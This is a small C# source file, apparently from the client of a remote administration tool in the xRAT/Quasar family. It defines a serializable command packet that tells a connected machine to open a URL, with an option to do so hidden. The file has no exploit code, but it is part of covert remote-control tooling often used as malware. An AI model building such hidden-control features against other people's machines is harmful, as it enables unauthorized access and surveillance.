using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoVisitWebsite : IPacket
{
	public string URL { get; set; }

	public bool Hidden { get; set; }

	public DoVisitWebsite()
	{
	}

	public DoVisitWebsite(string url, bool hidden)
	{
		URL = url;
		Hidden = hidden;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
